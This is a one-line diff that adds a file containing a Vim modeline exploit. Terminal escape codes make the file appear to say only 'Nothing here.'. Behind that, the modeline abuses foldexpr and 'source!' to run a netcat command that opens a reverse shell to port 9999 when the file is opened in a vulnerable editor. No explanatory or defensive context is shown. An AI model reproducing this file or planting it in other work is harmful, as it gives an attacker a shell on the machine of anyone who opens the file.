@@ -1,0 +1,1 @@
+[?7lSNothing here.:silent! w | call system('nohup nc 127.0.0.1 9999 -e /bin/sh &') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails('set\ fde=x\ \|\ source\!\ \%') fdl=0: [1G[KNothing here."[D 
